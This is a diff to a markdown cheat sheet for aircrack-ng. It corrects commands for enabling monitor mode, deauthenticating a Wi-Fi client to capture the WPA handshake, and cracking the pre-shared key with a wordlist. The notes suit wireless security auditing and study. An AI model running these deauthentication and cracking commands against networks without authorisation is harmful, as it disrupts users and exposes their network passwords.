@@ -7,7 +7,7 @@ Show interfaces, chipsets and drivers:
 
 ```bash
 
-airmon-ng
+sudo airmon-ng
 
 ```
 
@@ -19,7 +19,6 @@ Start monitor mode on specific interface (network card):
 sudo airmon-ng start wlx0008caa46de5
 
 ```
-
 
 Start packet capture on specific interface (network card):
 
@@ -53,7 +52,7 @@ besside-ng
 
 ```bash
 
-sudo airmon-ng start wlan0
+sudo airmon-ng start wlan0mon
 
 ```
 - unblock (from soft block) wi-fi interfaces if needed (optional):
@@ -124,10 +123,9 @@ sudo aireplay-ng --test wlan0mon
 
 - deauthenticate the wireless client in order to capture the handshake (may need to run multiple times, optional step) using `sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0` (`BSSID` of AP then client);
 
-- crack the password using dictionary using `sudo aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap`;
+- crack the password using dictionary using `sudo aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap` (`BSSID` of access point);
 
 #### Notes
 
 WPA/WPA2 supports many types of authentication beyond pre-shared keys. Aircrack-ng can ONLY crack pre-shared keys. So make sure airodump-ng shows the network as having the authentication type of PSK, 
 otherwise, don't bother trying to crack it. Only plain brute force techniques can be used against WPA/WPA2. 
-
